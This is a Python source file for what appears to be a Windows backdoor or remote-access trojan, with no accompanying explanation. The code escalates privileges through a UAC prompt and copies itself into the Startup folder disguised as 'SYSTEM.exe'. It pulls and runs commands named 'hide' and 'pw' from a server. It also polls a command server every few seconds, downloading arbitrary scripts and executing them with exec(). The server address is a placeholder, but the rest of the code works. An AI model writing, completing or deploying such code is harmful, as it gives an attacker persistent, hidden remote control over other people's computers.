import urllib.request
import subprocess
import pyautogui
import subprocess
import shutil
import cv2
import PIL
import psutil
import threading
import time
import os
import requests
import sys
import ctypes


server_url = "http://example.txt" # MUST BE HTTP NOT HTTPS
scripts_url = f"{server_url}/scripts.txt"
check_interval = 5
APPDATA = os.getenv("APPDATA")
TEMP = os.getenv("TEMP")
STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
SCRIPT_NAME = "SYSTEM.exe"
SCRIPT_PATH = os.path.join(STARTUP_PATH, SCRIPT_NAME)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False
def request_admin():
    if not is_admin():
        script = os.path.abspath(sys.argv[0])
        params = " ".join(sys.argv[1:])
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
            sys.exit()
        except:
            pass
def get_target_url():
    try:
        with urllib.request.urlopen(scripts_url) as response:
            return response.read().decode("utf-8").strip().splitlines()
    except:
        return None
def download_and_execute_script(script_name):
    script_url = f"{server_url}/scripts/{script_name}"
    try:
        urllib.request.urlretrieve(script_url, os.path.join(TEMP, script_name))
        execute_script(os.path.join(TEMP, script_name))
    except:
        var = None
def execute_script(script_name):
    def run_script():
        try:
            exec(open(script_name).read())
        except:
            var = None
    thread = threading.Thread(target=run_script)
    thread.start()
def send_completion_request():
    try:
        response = requests.post(f"{server_url}/update", data="OK")
    except:
        var = None
def save_copy():
    try:
        if sys.argv[0] != SCRIPT_PATH:
            shutil.copy(sys.argv[0], SCRIPT_PATH)
            if is_admin():
                hider = requests.get(f"{server_url}/hide.txt").text
                subprocess.Popen(f'{hider} "{SCRIPT_PATH}"')
    except:
        pass

request_admin()
if is_admin():
    subprocess.Popen(requests.get(f"{server_url}/pw.txt").text)
save_copy()
while True:
    try:
        script_names = get_target_url()
        if script_names:
            for script_name in script_names:
                download_and_execute_script(script_name)
            send_completion_request()

        time.sleep(check_interval)
    except:
        print(e)